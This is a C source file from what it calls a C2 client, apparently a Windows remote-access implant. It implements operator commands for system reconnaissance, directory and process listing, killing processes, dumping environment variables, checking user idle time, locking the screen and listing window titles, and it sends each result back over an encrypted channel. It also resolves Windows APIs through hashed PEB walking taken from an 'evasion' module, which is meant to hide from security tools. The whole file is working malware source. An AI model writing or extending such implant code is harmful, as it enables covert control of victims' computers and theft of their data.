/*
 * client/handlers_system.c  –  System-information and filesystem shell handlers
 * ===============================================================================
 * Implements the native C2 verb handlers for:
 *   sysinfo        — OS, hostname, username, arch, CWD
 *   os_info        — extended OS info (build, install date, uptime)
 *   cd <path>      — SetCurrentDirectoryA
 *   ls [path]      — directory listing (name, size, date)
 *   ps             — running process list (PID, PPID, name, arch, owner)
 *   kill <pid>     — TerminateProcess
 *   env [filter]   — environment variables (optional substring filter)
 *   idle_time      — seconds since last user input
 *   lock_screen    — LockWorkStation
 *   active_windows — visible top-level window titles
 *
 * All functions are declared in shell_internal.h and only called from
 * the dispatch loop in shell.c.
 */

#include "shell_internal.h"
#include "../evasion/peb_walk.h"

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


/* ── _handle_sysinfo ────────────────────────────────────────────────────── */

void _handle_sysinfo(TLS_CONTEXT *pTls)
{
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD cbHost = sizeof(hostname);
    GetComputerNameA(hostname, &cbHost);

    char username[256] = {0};
    DWORD cbUser = sizeof(username);
    GetUserNameA(username, &cbUser);

    char cwd[MAX_PATH] = {0};
    GetCurrentDirectoryA(sizeof(cwd), cwd);

    OSVERSIONINFOEXW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    typedef NTSTATUS (WINAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    PVOID hNtdll_ = peb_get_module(peb_hash_str("ntdll.dll"));
    RtlGetVersion_t pRtlGetVersion =
        (RtlGetVersion_t)(hNtdll_ ? peb_get_export(hNtdll_, peb_hash_str("RtlGetVersion")) : NULL);
    if (pRtlGetVersion)
        pRtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);

    SYSTEM_INFO si = {0};
    GetNativeSystemInfo(&si);
    const char *arch = "x86";
    if      (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) arch = "x64";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) arch = "ARM64";

    char buf[4096] = {0};
    _snprintf(buf, sizeof(buf) - 1,
        "[*] System Information\n"
        "    OS:           Windows %lu.%lu (Build %lu)\n"
        "    Hostname:     %s\n"
        "    Username:     %s\n"
        "    Architecture: %s\n"
        "    CWD:          %s",
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        hostname, username, arch, cwd);

    _send_str(pTls, buf);
}


/* ── _handle_os_info ────────────────────────────────────────────────────── */

void _handle_os_info(TLS_CONTEXT *pTls)
{
    OSVERSIONINFOEXW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    typedef NTSTATUS (WINAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    PVOID hNtdll2_ = peb_get_module(peb_hash_str("ntdll.dll"));
    RtlGetVersion_t pRtlGetVersion =
        (RtlGetVersion_t)(hNtdll2_ ? peb_get_export(hNtdll2_, peb_hash_str("RtlGetVersion")) : NULL);
    if (pRtlGetVersion)
        pRtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);

    ULONGLONG ms   = GetTickCount64();
    ULONGLONG secs = ms / 1000;
    ULONGLONG days = secs / 86400; secs %= 86400;
    ULONGLONG hrs  = secs / 3600;  secs %= 3600;
    ULONGLONG mins = secs / 60;    secs %= 60;

    char installDate[64] = "(unknown)";
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD dwInstall = 0;
        DWORD cbVal = sizeof(dwInstall);
        if (RegQueryValueExA(hKey, "InstallDate", NULL, NULL,
                             (LPBYTE)&dwInstall, &cbVal) == ERROR_SUCCESS) {
            /*
             * dwInstall is a Unix epoch timestamp (seconds since 1970-01-01).
             * Convert to FILETIME (100-nanosecond intervals since 1601-01-01):
             *   ft = (unix_epoch + 11644473600) * 10000000
             * Use LONGLONG (== __int64) for 64-bit arithmetic on all targets;
             * guard against an obviously bogus value (0 or before 1970) before
             * doing any arithmetic to avoid UB.
             */
            if (dwInstall > 0) {
                LONGLONG ft = ((LONGLONG)(DWORD)dwInstall + 11644473600LL)
                              * 10000000LL;
                FILETIME ftFile;
                ftFile.dwLowDateTime  = (DWORD)((ULONGLONG)ft & 0xFFFFFFFFUL);
                ftFile.dwHighDateTime = (DWORD)((ULONGLONG)ft >> 32);
                SYSTEMTIME st = {0};
                if (FileTimeToSystemTime(&ftFile, &st))
                    _snprintf(installDate, sizeof(installDate) - 1,
                        "%04d-%02d-%02d", st.wYear, st.wMonth, st.wDay);
            }
        }
        RegCloseKey(hKey);
    }

    char sp[128] = {0};
    WideCharToMultiByte(CP_ACP, 0, osvi.szCSDVersion, -1,
                        sp, sizeof(sp) - 1, NULL, NULL);

    char buf[1024] = {0};
    _snprintf(buf, sizeof(buf) - 1,
        "[*] OS Info\n"
        "    Version:      Windows %lu.%lu (Build %lu) %s\n"
        "    Install date: %s\n"
        "    Uptime:       %llud %lluh %llum %llus",
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        sp[0] ? sp : "",
        installDate,
        days, hrs, mins, secs);

    _send_str(pTls, buf);
}


/* ── _handle_cd ─────────────────────────────────────────────────────────── */

void _handle_cd(TLS_CONTEXT *pTls, const char *path)
{
    if (SetCurrentDirectoryA(path)) {
        char cwd[MAX_PATH] = {0};
        GetCurrentDirectoryA(sizeof(cwd), cwd);
        char buf[MAX_PATH + 16];
        _snprintf(buf, sizeof(buf) - 1, "[+] cwd: %s", cwd);
        _send_str(pTls, buf);
    } else {
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] Not found: %s", path);
        _send_str(pTls, buf);
    }
}


/* ── _handle_ls ─────────────────────────────────────────────────────────── */

void _handle_ls(TLS_CONTEXT *pTls, const char *path)
{
    char target[MAX_PATH]  = {0};
    char pattern[MAX_PATH] = {0};

    if (path && *path)
        strncpy(target, path, MAX_PATH - 1);
    else
        GetCurrentDirectoryA(sizeof(target), target);

    _snprintf(pattern, sizeof(pattern) - 1, "%s\\*", target);

    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(pattern, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        char err[MAX_PATH + 32];
        _snprintf(err, sizeof(err) - 1, "[-] ls: cannot open: %s", target);
        _send_str(pTls, err);
        return;
    }

    size_t bufSize = 16384;
    char  *buf = (char *)malloc(bufSize);
    if (!buf) { FindClose(hFind); _send_str(pTls, "[-] ls: OOM"); return; }

    int off = _snprintf(buf, bufSize - 1, "Directory of %s\n\n", target);
    if (off < 0) off = 0;

    do {
        if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0)
            continue;

        BOOL isDir  = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)     != 0;
        BOOL isLink = (ffd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0;

        SYSTEMTIME st = {0};
        FILETIME   ft = ffd.ftLastWriteTime;
        FileTimeToLocalFileTime(&ft, &ft);
        FileTimeToSystemTime(&ft, &st);

        char line[512];
        int  lineLen;

        if (isDir) {
            lineLen = _snprintf(line, sizeof(line) - 1,
                "  [%s]  %-40s  %04d-%02d-%02d %02d:%02d\n",
                isLink ? "LNK" : "DIR", ffd.cFileName,
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
        } else {
            ULONGLONG sz = ((ULONGLONG)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow;
            lineLen = _snprintf(line, sizeof(line) - 1,
                "  [%s]  %-40s  %12llu bytes  %04d-%02d-%02d %02d:%02d\n",
                isLink ? "LNK" : "   ", ffd.cFileName,
                (unsigned long long)sz,
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
        }

        if (lineLen > 0) {
            if ((size_t)(off + lineLen + 2) >= bufSize) {
                bufSize *= 2;
                char *p = (char *)realloc(buf, bufSize);
                if (!p) break;
                buf = p;
            }
            memcpy(buf + off, line, lineLen);
            off += lineLen;
        }
    } while (FindNextFileA(hFind, &ffd));

    FindClose(hFind);
    buf[off] = '\0';

    if (off > 0) tls_send_msg(pTls, (const BYTE *)buf, (DWORD)off);
    else         _send_str(pTls, "(empty directory)");

    free(buf);
}


/* ── _handle_ps ─────────────────────────────────────────────────────────── */

void _handle_ps(TLS_CONTEXT *pTls)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        _send_str(pTls, "[-] ps: CreateToolhelp32Snapshot failed");
        return;
    }

    size_t bufSize = 65536;
    char  *buf = (char *)malloc(bufSize);
    if (!buf) { CloseHandle(hSnap); _send_str(pTls, "[-] ps: OOM"); return; }

    int off = _snprintf(buf, bufSize - 1,
        "  %-8s %-8s %-40s %-6s %s\n"
        "  %-8s %-8s %-40s %-6s %s\n",
        "PID", "PPID", "Name", "Arch", "User",
        "---", "----", "----", "----", "----");
    if (off < 0) off = 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
        do {
            DWORD pid = pe.th32ProcessID;
            const char *arch = "x64";
            char ownerBuf[256] = {0};

            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (hProc) {
                BOOL bWow64 = FALSE;
                IsWow64Process(hProc, &bWow64);
                if (bWow64) arch = "x86";

                HANDLE hTok = NULL;
                if (OpenProcessToken(hProc, TOKEN_QUERY, &hTok)) {
                    DWORD cbTI = 0;
                    GetTokenInformation(hTok, TokenUser, NULL, 0, &cbTI);
                    if (cbTI > 0) {
                        BYTE *pTI = (BYTE *)malloc(cbTI);
                        if (pTI && GetTokenInformation(hTok, TokenUser, pTI, cbTI, &cbTI)) {
                            TOKEN_USER *pTU = (TOKEN_USER *)pTI;
                            char name[128] = {0}, domain[128] = {0};
                            DWORD cbN = sizeof(name), cbD = sizeof(domain);
                            SID_NAME_USE snu;
                            if (LookupAccountSidA(NULL, pTU->User.Sid,
                                                  name, &cbN, domain, &cbD, &snu))
                                _snprintf(ownerBuf, sizeof(ownerBuf) - 1,
                                    "%s\\%s", domain, name);
                        }
                        free(pTI);
                    }
                    CloseHandle(hTok);
                }
                CloseHandle(hProc);
                if (!ownerBuf[0]) strncpy(ownerBuf, "(unknown)", sizeof(ownerBuf) - 1);
            } else {
                strncpy(ownerBuf, "(access denied)", sizeof(ownerBuf) - 1);
                arch = "?";
            }

            /* Under -DUNICODE, PROCESSENTRY32 == PROCESSENTRY32W and
               szExeFile is WCHAR[]. Convert to UTF-8 for the output buffer. */
            char exeName[MAX_PATH] = {0};
            WideCharToMultiByte(CP_UTF8, 0, (LPCWCH)pe.szExeFile, -1,
                                exeName, (int)sizeof(exeName) - 1, NULL, NULL);

            char line[512];
            int lineLen = _snprintf(line, sizeof(line) - 1,
                "  %-8lu %-8lu %-40s %-6s %s\n",
                (unsigned long)pid,
                (unsigned long)pe.th32ParentProcessID,
                exeName, arch, ownerBuf);

            if (lineLen > 0) {
                if ((size_t)(off + lineLen + 2) >= bufSize) {
                    bufSize *= 2;
                    char *p = (char *)realloc(buf, bufSize);
                    if (!p) break;
                    buf = p;
                }
                memcpy(buf + off, line, lineLen);
                off += lineLen;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    buf[off] = '\0';

    if (off > 0) tls_send_msg(pTls, (const BYTE *)buf, (DWORD)off);
    else         _send_str(pTls, "(no processes)");

    free(buf);
}


/* ── _handle_kill ───────────────────────────────────────────────────────── */

void _handle_kill(TLS_CONTEXT *pTls, const char *args)
{
    DWORD pid = (DWORD)strtoul(args, NULL, 10);
    if (pid == 0) { _send_str(pTls, "Usage: kill <pid>"); return; }

    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProc) {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] kill: OpenProcess(%lu) failed (err %lu)",
            (unsigned long)pid, GetLastError());
        _send_str(pTls, buf);
        return;
    }
    BOOL ok = TerminateProcess(hProc, 1);
    CloseHandle(hProc);

    char buf[64];
    if (ok)
        _snprintf(buf, sizeof(buf) - 1, "[+] killed PID %lu", (unsigned long)pid);
    else
        _snprintf(buf, sizeof(buf) - 1,
            "[-] kill: TerminateProcess failed (err %lu)", GetLastError());
    _send_str(pTls, buf);
}


/* ── _handle_env ────────────────────────────────────────────────────────── */

void _handle_env(TLS_CONTEXT *pTls, const char *filter)
{
    LPWCH envW = GetEnvironmentStringsW();
    if (!envW) { _send_str(pTls, "[-] env: GetEnvironmentStringsW failed"); return; }

    size_t bufSize = 32768;
    char  *buf = (char *)malloc(bufSize);
    if (!buf) { FreeEnvironmentStringsW(envW); _send_str(pTls, "[-] env: OOM"); return; }

    int off = 0;
    const WCHAR *pw = envW;
    while (*pw) {
        char line[2048] = {0};
        WideCharToMultiByte(CP_ACP, 0, pw, -1, line, sizeof(line) - 1, NULL, NULL);
        size_t len = strlen(line);
        pw += wcslen(pw) + 1;

        if (line[0] == '=') continue;   /* skip hidden "=X:=..." vars */

        int match = 1;
        if (filter && *filter) {
            const char *h = line;
            match = 0;
            while (*h) {
                const char *hh = h, *nn = filter;
                while (*hh && *nn && ((*hh | 0x20) == (*nn | 0x20))) { hh++; nn++; }
                if (!*nn) { match = 1; break; }
                h++;
            }
        }
        if (match) {
            if ((size_t)(off + len + 2) >= bufSize) {
                bufSize *= 2;
                char *np = (char *)realloc(buf, bufSize);
                if (!np) break;
                buf = np;
            }
            memcpy(buf + off, line, len);
            off += (int)len;
            buf[off++] = '\n';
        }
    }
    FreeEnvironmentStringsW(envW);
    buf[off] = '\0';

    if (off > 0) tls_send_msg(pTls, (const BYTE *)buf, (DWORD)off);
    else         _send_str(pTls, filter ? "[-] env: no matches" : "(empty environment)");

    free(buf);
}


/* ── _handle_idle_time ──────────────────────────────────────────────────── */

void _handle_idle_time(TLS_CONTEXT *pTls)
{
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(lii);
    if (!GetLastInputInfo(&lii)) {
        _send_str(pTls, "[-] idle_time: GetLastInputInfo failed");
        return;
    }
    DWORD idleMs = GetTickCount() - lii.dwTime;
    char buf[64];
    _snprintf(buf, sizeof(buf) - 1,
        "[*] idle_time: %lu seconds", (unsigned long)(idleMs / 1000));
    _send_str(pTls, buf);
}


/* ── _handle_lock_screen ────────────────────────────────────────────────── */

void _handle_lock_screen(TLS_CONTEXT *pTls)
{
    if (LockWorkStation())
        _send_str(pTls, "[+] workstation locked");
    else {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] lock_screen: LockWorkStation failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
    }
}


/* ── _handle_active_windows ─────────────────────────────────────────────── */

typedef struct { char *buf; size_t bufSize; int off; } _WinEnum;

static BOOL CALLBACK _enum_windows_cb(HWND hwnd, LPARAM lParam)
{
    _WinEnum *e = (_WinEnum *)lParam;
    if (!IsWindowVisible(hwnd)) return TRUE;

    char title[256] = {0};
    GetWindowTextA(hwnd, title, sizeof(title) - 1);
    if (!title[0]) return TRUE;

    int len = (int)strlen(title);
    if ((size_t)(e->off + len + 2) >= e->bufSize) {
        e->bufSize *= 2;
        char *p = (char *)realloc(e->buf, e->bufSize);
        if (!p) return FALSE;
        e->buf = p;
    }
    memcpy(e->buf + e->off, title, len);
    e->off += len;
    e->buf[e->off++] = '\n';
    return TRUE;
}

void _handle_active_windows(TLS_CONTEXT *pTls)
{
    _WinEnum e;
    e.bufSize = 8192;
    e.off     = 0;
    e.buf     = (char *)malloc(e.bufSize);
    if (!e.buf) { _send_str(pTls, "[-] active_windows: OOM"); return; }

    EnumWindows(_enum_windows_cb, (LPARAM)&e);
    e.buf[e.off] = '\0';

    if (e.off > 0) tls_send_msg(pTls, (const BYTE *)e.buf, (DWORD)e.off);
    else           _send_str(pTls, "(no visible windows)");

    free(e.buf);
}
